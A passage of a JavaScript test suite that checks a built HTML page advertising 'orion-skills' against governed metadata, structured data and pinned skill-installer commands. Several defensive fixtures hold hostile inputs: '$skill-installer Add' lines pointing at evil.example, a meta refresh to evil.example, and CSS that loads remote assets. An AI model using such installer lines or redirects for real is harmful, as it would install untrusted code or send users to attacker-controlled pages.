import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import test from 'node:test';
import { parse, serializeOuter } from 'parse5';
import postcss from 'postcss';

const html = readFileSync(new URL('../dist/index.html', import.meta.url), 'utf8');
const clientEntry = readFileSync(
  new URL('../index.tsx', import.meta.url),
  'utf8',
);
const canonicalPageUrl = 'https://www.danmercede.com/works/orion-skills/';
const libraryStructuredId =
  `${canonicalPageUrl}#software`;
const codexStarterStructuredId =
  `${canonicalPageUrl}#codex-starter`;
const canonicalJsonLdContext = 'https://schema.org';
const isRuntimePlatformKey = (key) =>
  key === 'runtimePlatform' ||
  /^(?:https?:\/\/schema\.org\/|schema:)runtimePlatform$/i.test(key);
const competingStructuredDataAttributes = new Set([
  'about',
  'datatype',
  'inlist',
  'itemid',
  'itemprop',
  'itemref',
  'itemscope',
  'itemtype',
  'prefix',
  'resource',
  'rev',
  'typeof',
  'vocab',
]);
const allowedOpenGraphProperties = new Set([
  'og:description',
  'og:image',
  'og:image:alt',
  'og:image:height',
  'og:image:type',
  'og:image:width',
  'og:site_name',
  'og:title',
  'og:type',
  'og:url',
]);

const semanticChildren = (node) => {
  const children = [...(node.childNodes ?? [])];
  if (node.content && !children.includes(node.content)) children.push(node.content);
  return children;
};
const activeChildren = (node) => node.childNodes ?? [];

const walk = (node, visit) => {
  visit(node);
  for (const child of semanticChildren(node)) {
    walk(child, visit);
  }
};

const walkActive = (node, visit) => {
  visit(node);
  for (const child of activeChildren(node)) {
    walkActive(child, visit);
  }
};

const findElements = (node, predicate) => {
  const matches = [];
  walk(node, (candidate) => {
    if (candidate.tagName && predicate(candidate)) matches.push(candidate);
  });
  return matches;
};

const findActiveElements = (node, predicate) => {
  const matches = [];
  walkActive(node, (candidate) => {
    if (candidate.tagName && predicate(candidate)) matches.push(candidate);
  });
  return matches;
};

const attribute = (node, name) =>
  node.attrs?.find((candidate) => candidate.name === name)?.value;

const nodeText = (node) => {
  if (node.nodeName === '#text') return node.value;
  return semanticChildren(node).map(nodeText).join('');
};

const spacedText = (node) => {
  if (node.nodeName === '#text') return node.value;
  return semanticChildren(node).map(spacedText).join(' ');
};

const activeNodeText = (node) => {
  if (node.nodeName === '#text') return node.value;
  return activeChildren(node).map(activeNodeText).join('');
};

const activeSpacedText = (node) => {
  if (node.nodeName === '#text') return node.value;
  return activeChildren(node).map(activeSpacedText).join(' ');
};

const isJsonLdScript = (node) =>
  node.tagName === 'script' &&
  attribute(node, 'type')?.split(';')[0].trim().toLowerCase() ===
    'application/ld+json';

const htmlText = (node, separator = '') => {
  if (isJsonLdScript(node)) return '';
  if (node.nodeName === '#text') return node.value;
  return semanticChildren(node)
    .map((child) => htmlText(child, separator))
    .join(separator);
};

const collectJsonStrings = (value, strings = []) => {
  if (typeof value === 'string') {
    strings.push(value);
  } else if (Array.isArray(value)) {
    for (const item of value) collectJsonStrings(item, strings);
  } else if (value && typeof value === 'object') {
    for (const [key, item] of Object.entries(value)) {
      strings.push(key);
      collectJsonStrings(item, strings);
    }
  }
  return strings;
};

const parsedJsonLdDocuments = (document) =>
  findElements(document, isJsonLdScript).map((script) =>
    JSON.parse(nodeText(script)),
  );

const decodedJsonLdStrings = (document) =>
  parsedJsonLdDocuments(document).flatMap((jsonLd) =>
    collectJsonStrings(jsonLd),
  );

const jsonLdNodeDefinitions = (document) => {
  const definitions = [];

  const visit = (value) => {
    if (Array.isArray(value)) {
      for (const item of value) visit(item);
      return;
    }
    if (!value || typeof value !== 'object') return;

    const keys = Object.keys(value);
    const hasId = typeof value['@id'] === 'string';
    const isReferenceOnly = hasId && keys.every((key) => key === '@id');
    if (
      (hasId && !isReferenceOnly) ||
      keys.some(isRuntimePlatformKey)
    ) {
      definitions.push(value);
    }

    for (const [key, item] of Object.entries(value)) {
      if (key !== '@context') visit(item);
    }
  };

  for (const jsonLd of parsedJsonLdDocuments(document)) visit(jsonLd);
  return definitions;
};

const assertJsonLdIsOnlyStructuredDataSyntax = (document) => {
  const violations = [];

  for (const node of findElements(document, () => true)) {
    for (const candidate of node.attrs ?? []) {
      const name = candidate.name.toLowerCase();
      const value = candidate.value.trim().toLowerCase();
      if (competingStructuredDataAttributes.has(name)) {
        violations.push(`${node.tagName}[${name}]`);
      } else if (
        name === 'property' &&
        !(
          node.tagName === 'meta' &&
          allowedOpenGraphProperties.has(value)
        )
      ) {
        violations.push(`${node.tagName}[property="${candidate.value}"]`);
      } else if (
        name === 'rel' &&
        value.split(/\s+/).some((token) => /[:/#?]/.test(token))
      ) {
        violations.push(`${node.tagName}[rel="${candidate.value}"]`);
      }
    }
  }

  assert.equal(
    violations.length,
    0,
    `JSON-LD must be the only structured-data syntax; Microdata or RDFa found: ${violations.join(', ')}`,
  );
};

const assertStructuredDataRuntimeBoundaries = (document) => {
  assertJsonLdIsOnlyStructuredDataSyntax(document);
  const jsonLdDocuments = parsedJsonLdDocuments(document);
  assert.ok(jsonLdDocuments.length, 'structured data must be present');
  for (const jsonLd of jsonLdDocuments) {
    assert.equal(
      jsonLd?.['@context'],
      canonicalJsonLdContext,
      'each JSON-LD block must use the canonical schema.org context',
    );

    const contexts = [];
    const collectContexts = (value) => {
      if (Array.isArray(value)) {
        for (const item of value) collectContexts(item);
      } else if (value && typeof value === 'object') {
        for (const [key, item] of Object.entries(value)) {
          if (key === '@context') contexts.push(item);
          else collectContexts(item);
        }
      }
    };
    collectContexts(jsonLd);
    assert.deepEqual(
      contexts,
      [canonicalJsonLdContext],
      'local or aliased JSON-LD contexts are forbidden',
    );
  }

  const nodes = jsonLdNodeDefinitions(document);
  const rawIds = nodes
    .map((node) => node['@id'])
    .filter((id) => typeof id === 'string');
  const ids = rawIds.map((id) => {
    let parsed;
    let normalized;
    try {
      parsed = new URL(id);
      normalized = decodeURI(parsed.href);
    } catch {
      assert.fail(
        `structured-data definition @id must be a canonical absolute HTTPS URL: ${id}`,
      );
    }
    assert.equal(
      parsed.protocol,
      'https:',
      `structured-data definition @id must use HTTPS: ${id}`,
    );
    assert.equal(
      id,
      normalized,
      `structured-data definition @id must be canonical and absolute: ${id}`,
    );
    return normalized;
  });

  assert.equal(
    new Set(ids).size,
    ids.length,
    'top-level structured-data identifiers must be unique; duplicate @id found',
  );

  const libraryNodes = nodes.filter(
    (node) => node['@id'] === libraryStructuredId,
  );
  const codexStarterNodes = nodes.filter(
    (node) => node['@id'] === codexStarterStructuredId,
  );
  assert.equal(libraryNodes.length, 1, 'exactly one library node is required');
  assert.equal(
    codexStarterNodes.length,
    1,
    'exactly one Codex starter node is required',
  );

  const codexRuntimeNodes = nodes.filter((node) =>
    Object.entries(node)
      .filter(([key]) => isRuntimePlatformKey(key))
      .flatMap(([, value]) => collectJsonStrings(value))
      .some((runtime) => /\bCodex\b/i.test(normalizeClaimText(runtime))),
  );
  assert.deepEqual(
    codexRuntimeNodes.map((node) => node['@id']),
    [codexStarterStructuredId],
    'only the governed Codex starter node may declare a Codex runtime',
  );

  return {
    library: libraryNodes[0],
    codexStarter: codexStarterNodes[0],
  };
};

const parseArtifact = (text, scriptingEnabled = true) =>
  parse(text, { sourceCodeLocationInfo: true, scriptingEnabled });
const roots = (document) =>
  findActiveElements(document, (node) => attribute(node, 'id') === 'root');
const semanticRoots = (document) =>
  findElements(document, (node) => attribute(node, 'id') === 'root');
const decodedAttributes = (document) =>
  findElements(document, () => true).flatMap((node) =>
    (node.attrs ?? []).map((candidate) => candidate.value),
  );
const installerSurface = (document) => [
  htmlText(document),
  ...decodedAttributes(document),
  ...decodedJsonLdStrings(document),
].join(' ');
const normalizeWhitespace = (value) => value.replace(/\s+/g, ' ').trim();
const normalizeClaimText = (value) =>
  normalizeWhitespace(
    value
      .normalize('NFKC')
      .replace(/\p{Default_Ignorable_Code_Point}/gu, ''),
  );
const claimSurfaces = (document) =>
  [
    htmlText(document, ' '),
    htmlText(document),
    ...findElements(document, (node) => !isJsonLdScript(node)).flatMap(
      (node) => [htmlText(node, ' '), htmlText(node)],
    ),
    ...decodedAttributes(document),
    ...decodedJsonLdStrings(document),
  ].map(normalizeClaimText).filter(Boolean);
const installerInvocations = (document) => [
  ...normalizeClaimText(installerSurface(document)).matchAll(
    /\$skill-installer\b/gi,
  ),
];
const nestedBrowsingTags = new Set([
  'embed',
  'fencedframe',
  'frame',
  'frameset',
  'iframe',
  'object',
  'portal',
]);
const assertNoRuntimeContentRedirectors = (document) => {
  const contexts = findElements(document, (node) =>
    nestedBrowsingTags.has(node.tagName),
  );
  assert.equal(
    contexts.length,
    0,
    `nested browsing context elements are forbidden: ${contexts
      .map((node) => node.tagName)
      .join(', ')}`,
  );
  assert.equal(
    findElements(document, (node) => node.tagName === 'base').length,
    0,
    'base elements are forbidden because they redirect asset URL resolution',
  );
  assert.equal(
    findElements(document, (node) => node.tagName === 'template').length,
    0,
    'template elements are forbidden because governed content must be active',
  );

  const inlineStyles = findElements(
    document,
    (node) =>
      node.tagName === 'style' || attribute(node, 'style') !== undefined,
  );
  assert.equal(
    inlineStyles.length,
    0,
    'inline style sources are forbidden because CSS-generated content bypasses visible claim review',
  );

  const hiddenGovernedContent = findElements(
    document,
    (node) =>
      attribute(node, 'hidden') !== undefined ||
      attribute(node, 'inert') !== undefined ||
      (
        attribute(node, 'aria-hidden')?.trim().toLowerCase() === 'true' &&
        /\bCodex\b/i.test(normalizeClaimText(htmlText(node)))
      ),
  );
  assert.equal(
    hiddenGovernedContent.length,
    0,
    'hidden, inert, or aria-hidden containers cannot conceal governed visible content',
  );

  const refreshRedirects = findElements(
    document,
    (node) =>
      node.tagName === 'meta' &&
      attribute(node, 'http-equiv')?.trim().toLowerCase() === 'refresh',
  );
  assert.equal(
    refreshRedirects.length,
    0,
    'meta refresh redirects are forbidden',
  );
};

const decodeCssIdentifier = (value) =>
  value
    .replace(
      /\\([0-9a-f]{1,6})(?:\r\n|[ \t\r\n\f])?/gi,
      (_, codePoint) => String.fromCodePoint(Number.parseInt(codePoint, 16)),
    )
    .replace(/\\([^\r\n\f])/g, '$1');

const allowedCssFunctions = new Set([
  'blur',
  'calc',
  'cubic-bezier',
  'minmax',
  'rect',
  'repeat',
  'rgb',
  'var',
]);

const assertCssCannotGenerateClaims = (css, sourceLabel) => {
  const stylesheet = postcss.parse(css);
  const generatedContentDeclarations = [];
  const generatedListMarkers = [];
  const generatedQuoteMarkers = [];
  const imports = [];
  const counterStyles = [];
  const externalValues = [];
  const ungovernedFunctions = [];

  stylesheet.walkDecls((declaration) => {
    const property = decodeCssIdentifier(declaration.prop).toLowerCase();
    const value = decodeCssIdentifier(declaration.value);
    if (property === 'content') {
      generatedContentDeclarations.push(declaration.toString());
    }
    if (
      property === 'list-style-type' ||
      (
        property === 'list-style' &&
        value.trim().toLowerCase() !== 'none'
      )
    ) {
      generatedListMarkers.push(declaration.toString());
    }
    if (property === 'quotes') {
      generatedQuoteMarkers.push(declaration.toString());
    }
    if (/\burl\s*\(/i.test(value)) {
      externalValues.push(declaration.toString());
    }
    for (const match of value.matchAll(/(-?[_a-z][\w-]*)\s*\(/gi)) {
      const functionName = match[1].toLowerCase();
      if (!allowedCssFunctions.has(functionName)) {
        ungovernedFunctions.push(
          `${functionName}: ${declaration.toString()}`,
        );
      }
    }
  });
  stylesheet.walkAtRules((rule) => {
    const name = decodeCssIdentifier(rule.name).toLowerCase();
    if (name === 'import') {
      imports.push(rule.toString());
    }
    if (name === 'counter-style') {
      counterStyles.push(rule.toString());
    }
  });

  assert.deepEqual(
    generatedContentDeclarations,
    [],
    `${sourceLabel} must not generate public text with the content property`,
  );
  assert.deepEqual(
    generatedListMarkers,
    [],
    `${sourceLabel} must not generate public text with list markers`,
  );
  assert.deepEqual(
    generatedQuoteMarkers,
    [],
    `${sourceLabel} must not generate public text with quote markers`,
  );
  assert.deepEqual(imports, [], `${sourceLabel} imports are forbidden`);
  assert.deepEqual(
    counterStyles,
    [],
    `${sourceLabel} custom counter styles are forbidden`,
  );
  assert.deepEqual(
    externalValues,
    [],
    `${sourceLabel} URL values are forbidden because visual claim assets must be governed in HTML`,
  );
  assert.deepEqual(
    ungovernedFunctions,
    [],
    `${sourceLabel} functions must stay inside the reviewed non-visual allowlist`,
  );
};

const assertStylesheetsCannotGenerateClaims = (document) => {
  const stylesheetHrefs = findElements(
    document,
    (node) =>
      node.tagName === 'link' &&
      attribute(node, 'rel')
        ?.toLowerCase()
        .split(/\s+/)
        .includes('stylesheet'),
  ).map((node) => attribute(node, 'href'));
  const localStylesheets = stylesheetHrefs.filter((href) =>
    /^\/works\/orion-skills\/assets\/[A-Za-z0-9_-]+\.css$/.test(href ?? ''),
  );

  assert.deepEqual(
    stylesheetHrefs,
    localStylesheets,
    'only content-bound local build stylesheets may style the page',
  );
  assert.equal(
    localStylesheets.length,
    1,
    'the production artifact must expose exactly one local stylesheet',
  );

  for (const href of localStylesheets) {
    const relativePath = href.slice('/works/orion-skills/'.length);
    const css = readFileSync(
      new URL(`../dist/${relativePath}`, import.meta.url),
      'utf8',
    );
    assertCssCannotGenerateClaims(css, 'local CSS');
  }
};

const document = parseArtifact(html);
const noScriptDocument = parseArtifact(html, false);
assertNoRuntimeContentRedirectors(document);
assertNoRuntimeContentRedirectors(noScriptDocument);
assertStylesheetsCannotGenerateClaims(document);
assertStylesheetsCannotGenerateClaims(noScriptDocument);
const rootElements = roots(document);
const noScriptRootElements = roots(noScriptDocument);
assert.equal(
  rootElements.length,
  1,
  'production HTML must contain exactly one semantic element with id=root',
);
assert.equal(
  noScriptRootElements.length,
  1,
  'JavaScript-free HTML must contain exactly one semantic element with id=root',
);
assert.equal(
  semanticRoots(document).length,
  1,
  'template content must not hide another element with id=root',
);
assert.equal(
  semanticRoots(noScriptDocument).length,
  1,
  'JavaScript-free template content must not hide another element with id=root',
);

const root = rootElements[0];
const noScriptRoot = noScriptRootElements[0];
assert.equal(root.tagName, 'div', 'the application root must remain a div');
assert.equal(
  noScriptRoot.tagName,
  'div',
  'the JavaScript-free application root must remain a div',
);
assert.ok(root.childNodes?.length, 'production HTML must contain a non-empty baked #root body');
assert.ok(
  root.sourceCodeLocation?.startTag && root.sourceCodeLocation?.endTag,
  'production HTML must carry an explicit opening and closing #root tag',
);

const bakedText = activeSpacedText(root);

const starterSkills = [
  'reprobe-stale-premise',
  'prove-control-binds',
  'prove-deploy-is-live',
];
const verifiedSourceRef = 'c334ca499beed06892ba0a51b2698ce75e4a3e05';
const socialCardName = 'og-card-codex-starter-b255f3038600.png';
const socialCardUrl = `${canonicalPageUrl}${socialCardName}`;
const governedDocumentTitle =
  'orion-skills: 26 skills for Claude Code + 3-skill Codex starter set';
const governedDocumentDescription =
  'orion-skills is an MIT-licensed library of 26 Agent Skills for Claude Code, plus a verified three-skill Codex starter set for stale-premise, control-binding, and live-deploy proof. Direct local install; no plugin marketplace.';
const governedSocialMetadata = [
  [
    'property',
    'og:title',
    governedDocumentTitle,
  ],
  [
    'property',
    'og:description',
    '26 disciplined Agent Skills for Claude Code, plus a verified three-skill Codex starter set. Direct local install; no plugin marketplace.',
  ],
  ['property', 'og:url', canonicalPageUrl],
  ['property', 'og:image', socialCardUrl],
  [
    'property',
    'og:image:alt',
    'orion-skills: 26 Claude Code skills and a three-skill Codex starter set',
  ],
  [
    'name',
    'twitter:title',
    governedDocumentTitle,
  ],
  [
    'name',
    'twitter:description',
    '26 disciplined Agent Skills for Claude Code, plus a verified three-skill Codex starter set. Direct local install; no plugin marketplace.',
  ],
  ['name', 'twitter:image', socialCardUrl],
  [
    'name',
    'twitter:image:alt',
    'orion-skills: 26 Claude Code skills and a three-skill Codex starter set',
  ],
];

const normalizedMetadataEntries = (document) =>
  findElements(
    document,
    (node) => node.tagName === 'meta',
  ).flatMap((node) =>
    ['property', 'name'].flatMap((keyAttribute) => {
      const rawKey = attribute(node, keyAttribute);
      if (rawKey === undefined) return [];
      const key = rawKey.trim().toLowerCase();
      assert.ok(
        key && !/\s/.test(key),
        `${keyAttribute} metadata keys must be a single token`,
      );
      return [
        {
          keyAttribute,
          key,
          content: attribute(node, 'content'),
        },
      ];
    }),
  );

const assertGovernedSocialMetadata = (document) => {
  const metadataEntries = normalizedMetadataEntries(document);

  for (const [keyAttribute, key, expectedContent] of governedSocialMetadata) {
    const values = metadataEntries
      .filter(
        (entry) =>
          entry.keyAttribute === keyAttribute && entry.key === key,
      )
      .map((entry) => entry.content);
    assert.equal(
      values.length,
      1,
      `${key} metadata must appear exactly once`,
    );
    assert.equal(
      values[0],
      expectedContent,
      `${key} metadata must equal its governed value`,
    );
  }
};

const assertGovernedDocumentMetadata = (document) => {
  const titleValues = findElements(
    document,
    (node) => node.tagName === 'title',
  ).map((node) => nodeText(node).trim());
  assert.deepEqual(
    titleValues,
    [governedDocumentTitle],
    'the governed document title must appear exactly once',
  );

  const descriptionValues = normalizedMetadataEntries(document)
    .filter(
      (entry) =>
        entry.keyAttribute === 'name' && entry.key === 'description',
    )
    .map((entry) => entry.content);
  assert.deepEqual(
    descriptionValues,
    [governedDocumentDescription],
    'the governed document description must appear exactly once',
  );

  const canonicalValues = findElements(
    document,
    (node) =>
      node.tagName === 'link' &&
      attribute(node, 'rel')
        ?.toLowerCase()
        .split(/\s+/)
        .includes('canonical'),
  ).map((node) => attribute(node, 'href'));
  assert.deepEqual(
    canonicalValues,
    [canonicalPageUrl],
    'the governed canonical URL must appear exactly once',
  );
};

const installerPrompts = starterSkills.map(
  (skill) =>
    `$skill-installer Install https://github.com/OrionArchitekton/orion-skills/tree/${verifiedSourceRef}/skills/${skill}`,
);

const occurrences = (text, value) => text.split(value).length - 1;

test('the root guard recognizes HTML-equivalent id spellings', () => {
  const duplicateFixture =
    '<div id="root"></div><DIV class="decoy" ID = \'root\'></DIV>';

  assert.equal(roots(parseArtifact(duplicateFixture)).length, 2);
});

test('the empty development root uses client rendering instead of hydration', () => {
  assert.match(clientEntry, /hasChildNodes\s*\(\s*\)/);
  assert.match(clientEntry, /\bcreateRoot\s*\(/);
  assert.match(clientEntry, /\bhydrateRoot\s*\(/);
});

test('artifact guards interpret rendered HTML character references', () => {
  const encodedFixture =
    '<meta name="description" content="&#36;skill-installer Add https://evil.example/from-attribute">' +
    '<DIV ID="r&#111;ot"><pre><code>&#36;skill-installer Add https://evil.example/from-text</code></pre></DIV>';
  const encodedDocument = parseArtifact(encodedFixture);

  assert.equal(roots(encodedDocument).length, 1);
  assert.equal(installerInvocations(encodedDocument).length, 2);
});

test('the claim surface preserves boundaries between rendered elements', () => {
  const splitClaim = parseArtifact(
    '<div id="root"><p>All skills</p><p>support Codex</p></div>',
  );

  assert.ok(
    claimSurfaces(splitClaim).some((surface) =>
      /All skills support Codex/i.test(surface),
    ),
  );
});

test('claim scans do not synthesize prose across alternate semantic views', () => {
  const inverseClaim = parseArtifact(
    '<div id="root"><p>support Codex</p><p>All skills</p></div>',
  );

  assert.ok(
    claimSurfaces(inverseClaim).every(
      (surface) => !/All skills support Codex/i.test(surface),
    ),
  );
});

test('artifact guards traverse inert template content before it can be materialized', () => {
  const templateDocument = parseArtifact(
    '<template id="deferred"><pre><code>&#36;skill-installer Add https://evil.example/from-template</code></pre></template>',
  );

  assert.equal(installerInvocations(templateDocument).length, 1);
});

test('an inert template root cannot satisfy the active application contract', () => {
  const inertRoot = parseArtifact(
    '<template><div id="root"><p>not active content</p></div></template>',
  );

  assert.equal(roots(inertRoot).length, 0);
});

test('the JavaScript-free parser exposes noscript installer content', () => {
  const noScriptFixture = parseArtifact(
    '<noscript><pre><code>&#36;skill-installer Add https://evil.example/js-disabled-fourth</code></pre></noscript>',
    false,
  );

  assert.equal(installerInvocations(noScriptFixture).length, 1);
});

test('nested browsing contexts cannot hide a secondary installer surface', () => {
  const srcdocFixture = parseArtifact(
    '<iframe srcdoc="&lt;pre&gt;&lt;code&gt;&amp;#36;skill-installer Add https://evil.example/srcdoc-fourth&lt;/code&gt;&lt;/pre&gt;"></iframe>',
  );

  assert.throws(
    () => assertNoRuntimeContentRedirectors(srcdocFixture),
    /nested browsing context/i,
  );
});

test('a base element cannot redirect the hydrated application', () => {
  const baseFixture = parseArtifact(
    '<head><base href="https://cdn.example.test/decoy/"></head><body></body>',
  );

  assert.throws(
    () => assertNoRuntimeContentRedirectors(baseFixture),
    /base|redirect|resolution/i,
  );
});

test('template content cannot impersonate active document metadata', () => {
  const templateFixture = parseArtifact(
    '<template><title>orion-skills: 26 skills for Claude Code + 3-skill Codex starter set</title></template>',
  );

  assert.throws(
    () => assertNoRuntimeContentRedirectors(templateFixture),
    /template|active/i,
  );
});

test('CSS-generated text cannot create an ungoverned runtime claim', () => {
  const generatedClaimFixture = parseArtifact(
    '<style>.claim::after{content:"Co\\64 ex"}</style>' +
      '<p class="claim">Every skill supports </p>',
  );

  assert.throws(
    () => assertNoRuntimeContentRedirectors(generatedClaimFixture),
    /style|generated|content/i,
  );
});

test('CSS list markers cannot create an ungoverned runtime claim', () => {
  assert.throws(
    () =>
      assertCssCannotGenerateClaims(
        'li{list-style-type:"All skills support Co\\\\64 ex"}',
        'fixture CSS',
      ),
    /list|marker|generated|text/i,
  );
});

test('CSS quote markers cannot create an ungoverned runtime claim', () => {
  assert.throws(
    () =>
      assertCssCannotGenerateClaims(
        'q{quotes:"Every skill supports Codex " ""}',
        'fixture CSS',
      ),
    /quote|generated|text/i,
  );
});

test('CSS escapes cannot hide an external visual claim asset', () => {
  assert.throws(
    () =>
      assertCssCannotGenerateClaims(
        'body{background-image:u\\\\72l(https://evil.example/claim.svg)}',
        'fixture CSS',
      ),
    /URL|asset|governed/i,
  );
});

test('CSS image functions cannot hide an external visual claim asset', () => {
  assert.throws(
    () =>
      assertCssCannotGenerateClaims(
        'body{background-image:image-set("https://evil.example/claim.svg" 1x)}',
        'fixture CSS',
      ),
    /function|image|asset|governed/i,
  );
});

test('visibility attributes cannot hide governed public content', () => {
  const hiddenFixture = parseArtifact(
    '<main hidden><p>Three skills are verified for Codex.</p></main>',
  );

  assert.throws(
    () => assertNoRuntimeContentRedirectors(hiddenFixture),
    /hidden|visible|visibility/i,
  );
});

test('meta refresh cannot redirect visitors away from the governed surface', () => {
  const refreshFixture = parseArtifact(
    '<head><meta HTTP-EQUIV=" ReFrEsH " content="0;url=https://evil.example/claude-only"></head>',
  );

  assert.throws(
    () => assertNoRuntimeContentRedirectors(refreshFixture),
    /meta|refresh|redirect/i,
  );
});

test('artifact guards decode JSON-LD Unicode escapes', () => {
  const jsonLdFixture = parseArtifact(
    '<script type="application/ld+json">' +
      '{"installer":"\\u0024skill-installer Add https://evil.example/from-json-ld",' +
      '"claim":"All skills \\u0073upport Codex"}' +
    '</script>',
  );

  assert.equal(installerInvocations(jsonLdFixture).length, 1);
  assert.ok(
    claimSurfaces(jsonLdFixture).some((surface) =>
      /All skills support Codex/i.test(surface),
    ),
  );
});

test('structured data cannot duplicate a governed identity', () => {
  const duplicateGraph = parseArtifact(
    `<script type="application/ld+json">${JSON.stringify({
      '@context': canonicalJsonLdContext,
      '@graph': [
        {
          '@id': libraryStructuredId,
          runtimePlatform: 'Claude Code',
        },
        {
          '@id': codexStarterStructuredId,
          runtimePlatform: 'Codex CLI',
        },
        {
          '@id': libraryStructuredId,
          runtimePlatform: 'Codex CLI',
        },
      ],
    })}</script>`,
  );

  assert.throws(
    () => assertStructuredDataRuntimeBoundaries(duplicateGraph),
    /duplicate|unique/i,
  );
});

test('nested structured-data definitions cannot reuse a governed identity', () => {
  const nestedDuplicate = parseArtifact(
    `<script type="application/ld+json">${JSON.stringify({
      '@context': canonicalJsonLdContext,
      '@graph': [
        {
          '@id': libraryStructuredId,
          runtimePlatform: 'Claude Code',
        },
        {
          '@id': codexStarterStructuredId,
          runtimePlatform: 'Codex CLI',
        },
        {
          '@id': 'https://www.danmercede.com/works/orion-skills/#wrapper',
          '@included': [
            {
              '@id': libraryStructuredId,
              runtimePlatform: 'Codex CLI',
            },
          ],
        },
      ],
    })}</script>`,
  );

  assert.throws(
    () => assertStructuredDataRuntimeBoundaries(nestedDuplicate),
    /duplicate|unique/i,
  );
});

test('relative structured-data identifiers cannot hide a governed identity collision', () => {
  const relativeDuplicate = parseArtifact(
    `<script type="application/ld+json">${JSON.stringify({
      '@context': canonicalJsonLdContext,
      '@graph': [
        {
          '@id': libraryStructuredId,
          runtimePlatform: 'Claude Code',
        },
        {
          '@id': codexStarterStructuredId,
          runtimePlatform: 'Codex CLI',
        },
        {
          '@id': '#software',
          sameAs: 'https://evil.example/merged-property',
        },
      ],
    })}</script>`,
  );

  assert.throws(
    () => assertStructuredDataRuntimeBoundaries(relativeDuplicate),
    /canonical|absolute|duplicate|unique/i,
  );
});

test('structured-data context aliases cannot hide a governed definition', () => {
  const aliasedDefinition = parseArtifact(
    `<script type="application/ld+json">${JSON.stringify({
      '@context': 'https://schema.org',
      '@graph': [
        {
          '@id': libraryStructuredId,
          runtimePlatform: 'Claude Code',
        },
        {
          '@id': codexStarterStructuredId,
          runtimePlatform: 'Codex CLI',
        },
        {
          '@context': {
            id: '@id',
            runtime: 'https://schema.org/runtimePlatform',
          },
          id: libraryStructuredId,
          runtime: 'Codex CLI',
        },
      ],
    })}</script>`,
  );

  assert.throws(
    () => assertStructuredDataRuntimeBoundaries(aliasedDefinition),
    /context|canonical/i,
  );
});

test('full-IRI runtime properties cannot bypass Codex ownership', () => {
  const fullIriRuntime = parseArtifact(
    `<script type="application/ld+json">${JSON.stringify({
      '@context': 'https://schema.org',
      '@graph': [
        {
          '@id': libraryStructuredId,
          runtimePlatform: 'Claude Code',
        },
        {
          '@id': codexStarterStructuredId,
          runtimePlatform: 'Codex CLI',
        },
        {
          '@id': 'https://www.danmercede.com/works/orion-skills/#extra',
          'https://schema.org/runtimePlatform': 'Codex CLI',
        },
      ],
    })}</script>`,
  );

  assert.throws(
    () => assertStructuredDataRuntimeBoundaries(fullIriRuntime),
    /only the governed Codex starter/i,
  );
});

test('competing HTML structured-data syntaxes cannot bypass runtime ownership', () => {
  const microdataRuntime = parseArtifact(
    `<script type="application/ld+json">${JSON.stringify({
      '@context': canonicalJsonLdContext,
      '@graph': [
        {
          '@id': libraryStructuredId,
          runtimePlatform: 'Claude Code',
        },
        {
          '@id': codexStarterStructuredId,
          runtimePlatform: 'Codex CLI',
        },
      ],
    })}</script>` +
      `<div itemscope itemid="${libraryStructuredId}" itemtype="https://schema.org/SoftwareSourceCode">` +
      '<meta itemprop="runtimePlatform" content="Codex CLI">' +
      '</div>',
  );

  assert.throws(
    () => assertStructuredDataRuntimeBoundaries(microdataRuntime),
    /structured-data syntax|Microdata|RDFa/i,
  );
});

test('JavaScript-free structured data enforces the same runtime boundary', () => {
  const safeGraph = {
    '@context': canonicalJsonLdContext,
    '@graph': [
      {
        '@id': libraryStructuredId,
        runtimePlatform: 'Claude Code',
      },
      {
        '@id': codexStarterStructuredId,
        runtimePlatform: 'Codex CLI',
      },
    ],
  };
  const hiddenDuplicate = {
    '@context': canonicalJsonLdContext,
    '@graph': [
      {
        '@id': libraryStructuredId,
        runtimePlatform: 'Codex CLI',
      },
    ],
  };
  const fixture =
    `<script type="application/ld+json">${JSON.stringify(safeGraph)}</script>` +
    `<noscript><script type="application/ld+json">${JSON.stringify(
      hiddenDuplicate,
    )}</script></noscript>`;

  assert.doesNotThrow(() =>
    assertStructuredDataRuntimeBoundaries(parseArtifact(fixture)),
  );
  assert.throws(
    () =>
      assertStructuredDataRuntimeBoundaries(parseArtifact(fixture, false)),
    /duplicate|unique/i,
  );
});

test('the JavaScript-free body exposes the exact Codex starter install path', () => {
  const installerBlocks = findActiveElements(
    root,
    (node) =>
      node.tagName === 'pre' && /\$skill-installer\b/i.test(activeNodeText(node)),
  );
  const installerCodeBlocks = installerBlocks.map((node) =>
    activeNodeText(node).trim(),
  );

  assert.deepEqual(
    installerCodeBlocks,
    installerPrompts,
    'every baked installer invocation must exactly match the approved starter set',
  );
  for (const [mode, parsedDocument] of [
    ['scripting enabled', document],
    ['scripting disabled', noScriptDocument],
  ]) {
    assert.equal(
      installerInvocations(parsedDocument).length,
      starterSkills.length,
      `the approved commands must be the only installer invocations with ${mode}`,
    );
  }
  for (const block of installerBlocks) {
    const classes = new Set((attribute(block, 'class') ?? '').split(/\s+/));
    assert.ok(classes.has('whitespace-pre-wrap'));
    assert.ok(classes.has('break-all'));
  }

  for (const prompt of installerPrompts) {
    assert.equal(
      occurrences(activeNodeText(root), prompt),
      1,
      `expected one baked installer prompt for ${prompt}`,
    );
  }

  assert.match(bakedText, /26.{0,80}Claude Code/i);
  assert.match(bakedText, /(?:three|3).{0,80}Codex/i);
  assert.match(bakedText, /separate.{0,80}(?:request|prompt)/i);
  assert.match(
    bakedText,
    /already exists.{0,120}inspect or (?:deliberately )?update.{0,120}continue.{0,80}(?:other|remaining) prompts/i,
  );
  assert.match(bakedText, /no plugin marketplace|not a plugin.{0,40}marketplace/i);
  assert.match(
    bakedText,
    new RegExp(`pinned.{0,80}${verifiedSourceRef.slice(0, 7)}`, 'i'),
  );
  assert.ok(
    findActiveElements(root, (node) => node.tagName === 'h2').some(
      (heading) =>
        /All 26 Claude Code skills$/.test(activeNodeText(heading).trim()),
    ),
  );
  assert.match(
    bakedText,
    /Codex starter set:.{0,80}reprobe-stale-premise.{0,80}prove-control-binds.{0,80}prove-deploy-is-live/i,
  );

  assert.match(
    bakedText,
    /The full Claude Code library uses slash-command invocation or description matching\. Codex exposes the verified starter skills with its native \$skill-name invocation after installation\./,
  );
  assert.deepEqual(
    findActiveElements(
      root,
      (node) =>
        node.tagName === 'button' &&
        /\bCodex\b/i.test(attribute(node, 'aria-label') ?? ''),
    ).map((node) => attribute(node, 'aria-label')),
    [
      'Copy command: Codex CLI: re-probe stale premises',
